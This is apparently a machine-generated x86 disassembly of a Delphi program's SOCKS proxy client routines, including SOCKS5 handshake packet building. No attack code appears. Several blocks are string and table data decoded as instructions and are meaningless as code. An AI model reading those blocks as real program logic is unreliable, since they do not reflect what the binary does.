call sub_403f50
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408080
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x14 ]
call sub_403fa4
sub_47110c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x14 ]
mov edx esi
call sub_403fa4
mov eax esi
call sub_404210
test eax eax
jle r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax esi
call sub_4081f8
mov [ ebx + 0xc ] eax
sub_471138
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_419638
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_471174
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
xor eax eax
mov [ esp ] eax
mov eax edi
call sub_4192f0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_4711bc
mov [ esp ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4711bc
cmp ebp [ eax + 0xc ]
jne r-xdata
sub_4711d0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov esi eax
test esi esi
je r-xdata
mov edx [ esi + 0x10 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_471200
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_471225
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47122c
retn
sub_471238
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47125d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471264
retn
sub_471272
inc edi
add [ ebx ] al
or eax 0x636f5354
imul esi [ ebx + 0x56 ] 0x65
jb r-xdata
imul esp [ ebx + 0x61 ] 0x6e6f6974
adc dh [ ebx + 0x61 ]
push ebp
imul ebp [ edi + 0x6e ] 0x1
add [ ebx ] al
add [ eax ] al
add [ eax + 0x12 ] dh
inc edi
add [ ecx ] cl
jae r-xdata
adc al 0x47
add [ ebx + edx + 0x42 ] al
add [ ebx + ecx * 4 + 0x141c0041 ] ch
jb r-xdata
ja r-xdata
dec esi
outsd
push ebx
outsd
arpl [ ebx + 0x73 ] bp
or [ ebx + 0x76 ] dh
push ebx
outsd
arpl [ ebx + 0x73 ] bp
xor al 0x9
jae r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
inc edx
sbb al 0x14
popad
insd
push eax
popad
jae r-xdata
inc edx
add [ edx + 0x17540042 ] ah
inc edx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffd4004713 ]
adc eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x4713
push ebx
outsd
arpl [ ebx + 0x73 ] bp
xor al 0x41
or [ ebx + 0x76 ] dh
push ebx
outsd
arpl [ ebx + 0x73 ] bp
xor eax 0x53644907
outsd
arpl [ ebx + 0x73 ] bp
mov eax eax
les edx [ edx ]
inc edi
add [ ebx ] al
adc al 0x54
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
add [ eax ] al
or al 0x54
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
nop
aam 0x13
inc edi
add [ edi ] al
or al 0x54
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
adc eax [ fs : edi ]
enter 0x46f6 0x0
or [ eax ] eax
pop es
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push es
add al al
adc al [ edi ]
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
push cs
inc ecx
jne r-xdata
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ edx - 0x707ffb9 ] ah
inc esi
add [ eax ] dh
stc
inc esi
add [ eax - 0x7 ] ah
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x6c0040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
jo r-xdata
and al 0x15
inc edx
add [ edi + edx + 0x42 ] dl
add al ch
adc al [ edx ]
sub al 0x14
adc al 0x42
pop es
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
lea eax [ eax ]
adc eax [ fs : edi ]
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x1
add [ ecx ] al
add [ eax ] al
add al al
adc al [ edi ]
adc dh [ ebx + 0x61 ]
dec esi
outsd
inc ecx
jne r-xdata
js r-xdata
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] r-xdata
insb
add [ eax ] al
[ eax + eax ]
add al cl
jae r-xdata
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x55617312
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
je r-xdata
jb r-xdata
add [ eax - 0x80000000 ] al
pop es
add [ eax ] cl
push ebp
inc edi
js r-xdata
dec [ edx + 0x47887c43 ]
jl r-xdata
popad
insd
jo r-xdata
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x55080007 ] al
push ebx
js r-xdata
mov [ edi + 0x74 ] eax
lea eax [ edi + 0x78 ]
mov edx [ ebx + 0x78 ]
call sub_403fa4
mov al [ ebx + 0x7c ]
mov [ edi + 0x7c ] al
jmp r-xdata
or [ ebx - 0x173c742a ] ecx
jo r-xdata
add [ eax ] al
add [ eax ] al
or [ eax ] al
pop es
push esi
jb r-xdata
inc edi
add [ eax + eax ] bh
lea eax [ edi + 0x70 ]
mov edx [ ebx + 0x70 ]
call sub_403fa4
mov eax [ ebx + 0x74 ]
xchg ebp eax
sub bh cl
pop edi
pop esi
pop ebx
retn
cli
[ edi + 0x5e ]
imul ebp [ edi + 0x6e ] 0x5300408d
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418c90
mov edi esi
mov al [ ebx + 0x68 ]
mov [ edi + 0x68 ] al
lea eax [ edi + 0x6c ]
mov edx [ ebx + 0x6c ]
call sub_403fa4
sub_471524
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46f718
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x74 ] 0x438
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_471568
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x114 ] ebx
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_471771
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x110 ] 0x4
mov [ ebp - 0x10f ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10e ] ax
cmp [ esi + 0x7c ] 0x2
jne r-xdata
lea ecx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46d0a0
mov edx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d658
mov [ ebp - 0x10c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_46d658
mov [ ebp - 0x10c ] eax
jmp r-xdata
add ebx 0x9
lea edx [ ebp - 0x110 ]
mov ecx ebx
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
lea edx [ ebp - 0x8 ]
mov ecx 0x8
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov al [ ebp - 0x7 ]
sub al 0x5a
je r-xdata
mov eax edi
call sub_404210
push eax
mov eax edi
call sub_404410
lea edx [ ebp + ebx - 0x106 ]
pop ecx
call sub_4028d8
mov eax edi
call sub_404210
inc ebx
add eax ebx
mov ebx eax
mov [ ebp + ebx - 0x107 ] 0x0
lea eax [ ebp - 0x108 ]
mov edx [ esi + 0x78 ]
mov ecx 0xff
call sub_4041ec
xor ebx ebx
mov bl [ ebp - 0x108 ]
mov [ ebp + ebx - 0x107 ] 0x0
cmp [ esi + 0x7c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471778
lea eax [ ebp - 0x124 ]
mov edx 0x5
call sub_403f74
retn
dec al
je r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x11c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x11c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x124 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
sub_471790
push ebp
mov ebp esp
push ecx
mov ecx 0x29
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_471d63
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov [ ebp - 0x10e ] 0x2
mov [ ebp - 0x10e ] 0x0
jmp r-xdata
mov al [ ebp - 0x10f ]
cmp al [ ebp - 0xd ]
jne r-xdata
mov al [ ebp - 0x10e ]
mov [ ebp - 0xd ] al
mov [ ebp - 0x110 ] 0x5
mov al 0x1
mov [ ebp - 0x10f ] al
and eax 0xff
add eax 0x2
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_403748#6
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
cmp al 0xff
jne r-xdata
mov [ ebp - 0x110 ] 0x5
mov [ ebp - 0x10f ] 0x1
mov [ ebp - 0x10e ] 0x0
mov [ ebp - 0x10d ] 0x3
mov eax [ ebp - 0x4 ]
call sub_404210
mov [ ebp - 0x10c ] al
mov esi 0x5
mov eax [ ebp - 0x4 ]
call sub_404210
test eax eax
jle r-xdata
mov [ ebp - 0x110 ] 0x1
mov eax [ ebx + 0x78 ]
call sub_404210
mov [ ebp - 0x10f ] al
mov esi 0x2
mov eax [ ebx + 0x78 ]
call sub_404210
test eax eax
jle r-xdata
cmp [ ebx + 0x68 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404210
add esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10 ] ax
lea edx [ ebp + esi - 0x110 ]
lea eax [ ebp - 0x10 ]
mov ecx 0x2
call sub_4028d8
add esi 0x2
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor eax eax
push ebp
push sub_471ac3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x5
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404210
push eax
mov eax [ ebp - 0x4 ]
call sub_404410
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028d8
mov eax [ ebx + 0x78 ]
call sub_404210
add esi eax
mov eax [ ebx + 0x70 ]
call sub_404210
mov [ ebp + esi - 0x110 ] al
inc esi
mov eax [ ebx + 0x70 ]
call sub_404210
test eax eax
jle r-xdata
mov eax [ ebx + 0x78 ]
call sub_404210
push eax
mov eax [ ebx + 0x78 ]
call sub_404410
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028d8
xor eax eax
mov al [ ebp - 0x10f ]
cmp eax 0x8
ja r-xdata
mov eax [ ebx + 0x70 ]
call sub_404210
add esi eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_403748#7
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebx + 0x70 ]
call sub_404210
push eax
mov eax [ ebx + 0x70 ]
call sub_404410
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028d8
lea edx [ ebp - 0x148 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x148 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp [ eax * 4 + sub_471b0c ]
cmp [ ebp - 0x10f ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
xor eax eax
push ebp
push j_sub_40361c#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_471d45
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_471b0c
mov bl 0x1c
inc edi
add [ 0x6100471b ] dh
sbb eax [ edi ]
lea ebx [ ebx ]
inc edi
add [ ecx - 0x1affb8e5 ] bh
sbb eax [ edi ]
adc [ edi + eax * 2 ] ebx
add [ edx ] bh
sbb al 0x47
add [ ebx + 0x1c ] ah
inc edi
add cl ch
jle r-xdata
add [ ebp - 0x1276b ] cl
jmp [ ecx + rw-data ]
add [ eax ] al
lea edx [ ebp - 0x128 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x128 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
mov al [ ebp - 0x10d ]
dec al
je r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub al 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_40361c#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
dec ecx
lea edx [ ebp - 0x10b ]
mov eax [ ebx + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_471d45
xor eax eax
mov al [ ebp - 0x10c ]
add eax 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0xc ] 0x12
jmp r-xdata
sub_471d74
push ebx
mov bl [ eax + 0x7c ]
dec ebx
sub bl 0x2
jb r-xdata
call sub_471568
pop ebx
retn
je r-xdata
call sub_471790
jmp r-xdata
pop ebx
retn
sub_471d90
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_471db5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471dbc
retn
sub_471dcc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ esi ] bl
inc edi
add [ eax ] cl
add [ eax ] al
add [ esp ] al
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
clc
stosb [ edi ]
inc ecx
add [ ebx + ebp * 4 + 0x41 ] al
add [ ebx + ebp * 4 + 0x41 ] bl
add [ eax + 0x1e ] al
inc edi
add [ eax + 0x1e ] bl
inc edi
add [ esi + ebx + 0x47 ] dl
add [ eax + 0xc0041ac ] al
push esp
dec ecx
push esp
inc ebx
push eax
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
lea eax [ eax ]
push ebx
mov ebx ecx
mov ecx ebx
mov eax [ eax + 0x4 ]
call sub_47340c
mov eax ebx
pop ebx
retn
sub_471e6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_471e91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471e98
retn
sub_471f00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ ecx ]
xor eax eax
jmp r-xdata
cmp eax [ ecx ]
jl r-xdata
mov bl [ edx + eax ]
sub bl 0xa
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov esi eax
mov [ edi ] 0x1
inc eax
mov [ ecx ] eax
jmp r-xdata
sub bl 0x3
je r-xdata
mov esi eax
mov [ edi ] 0x1
inc eax
cmp eax [ ecx ]
jge r-xdata
jmp r-xdata
mov [ ecx ] eax
jmp r-xdata
cmp [ edx + eax ] 0xa
jne r-xdata
inc eax
inc eax
mov [ ecx ] eax
jmp r-xdata
sub_471f50
push ebp
mov ebp esp
add esp 0xfffff6d4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x81c ] ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_472124
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebx ]
call sub_403368
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
or ecx 0xffffffff
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
jmp r-xdata
mov [ ebp - 0x15 ] 0x0
mov eax [ ebp + 0x8 ]
call sub_403f50
mov cx 0x1
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov esi eax
mov cx 0x2
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov [ ebp - 0x14 ] eax
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebp - 0x14 ]
sub eax esi
test eax eax
jle r-xdata
mov [ ebp - 0x4 ] 0x7fffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47212b
lea eax [ ebp - 0x81c ]
call sub_403f50
retn
cmp [ ebp - 0x5 ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x81c ]
push eax
lea edx [ ebp - 0x92c ]
mov eax [ ebx ]
call sub_4030a4
lea eax [ ebp - 0x92c ]
mov [ ebp - 0x82c ] eax
mov [ ebp - 0x828 ] 0x4
mov [ ebp - 0x824 ] esi
mov [ ebp - 0x820 ] 0x0
lea edx [ ebp - 0x82c ]
mov ecx 0x1
mov eax r-xdata
call sub_408df4
mov ecx [ ebp - 0x81c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
cmp esi [ ebp - 0x14 ]
jge r-xdata
mov eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41aae4
jmp r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
sub eax esi
mov edx 0x800
call sub_46e9fc
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x816 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_41acf0
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x816 ]
mov eax [ ebx ]
call sub_471f00
mov edi eax
add esi [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404210
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax edi
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
add edx edi
mov eax [ ebp + 0x8 ]
call sub_40459c
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404410
mov edx [ ebp - 0x10 ]
lea edx [ eax + edx ]
lea eax [ ebp - 0x816 ]
mov ecx edi
call sub_4028d8
mov edi [ ebp - 0x4 ]
sub edi [ ebp - 0x10 ]
mov [ ebp - 0x15 ] 0x1
sub esi [ ebp - 0xc ]
add esi edi
sub_472160
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_472185
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47218c
retn
sub_4721d5
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add ah bl
sub [ edi ] al
add [ ebx ] 0x0
or [ ebx + 0x6f ] edx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
nop
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add [ eax ] ah
sub [ edi ] eax
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add ah dl
inc edi
add al bh
clc
inc esi
add [ eax ] dh
stc
inc esi
add [ eax - 0x7 ] ah
inc esi
add al bh
or al [ edi ]
dec esp
and eax [ edi ]
fsub [ edi + eax * 2 ]
add al al
inc edi
add [ eax ] dl
daa
inc edi
add [ eax + 0x27 ] al
inc edi
add [ edi + 0x47 ] cl
add ah cl
daa
inc edi
add [ edx ] dl
push esp
dec ecx
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
pop eax
and al [ edi ]
pop es
adc dl [ ecx + ecx * 2 + 0x64 ]
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al 0x0
or [ ebp + 0x73 ] dl
dec esi
popad
insb
lea eax [ eax ]
and [ ebx ] ah
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_420ef8
mov eax [ r-xdata ]
call sub_46f3a4
test al al
je r-xdata
popad
nop
push ebx
mov ebx eax
mov eax ebx
call sub_470ac0
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
je r-xdata
and [ edi ] eax
xchg esp eax
or al [ edi ]
add eax 0x64491100
dec ecx
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_46e9fc
mov edi eax
jmp r-xdata
pop ebx
retn
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
and eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp ah [ ebx ]
inc edi
add [ eax ] cl
add [ eax ] al
mov al 0x6a
inc ecx
add [ ebx + esi + 0xc180040 ] al
inc edx
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
mov al 0xb
inc edx
add ah cl
or al 0x42
add [ eax + 0x29 ] cl
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x68 ] si
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsw
add [ eax ] dl
inc eax
add [ eax + eax ] ch
[ eax + eax ]
adc eax [ edi ]
mov ah 0x28
inc edi
add [ eax + ebp + 0x47 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53090003 ] al
outsd
add al dl
mov eax esi
call sub_46ecfc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_46ecfc
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_420f20
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_420f28
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_404210
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f360
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4724b8
mov eax [ ebp - 0x4 ]
call sub_403154
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_472368
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4724ce
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0xfffffffe
sete bl
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ae0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4724b1
push [ fs : eax ]
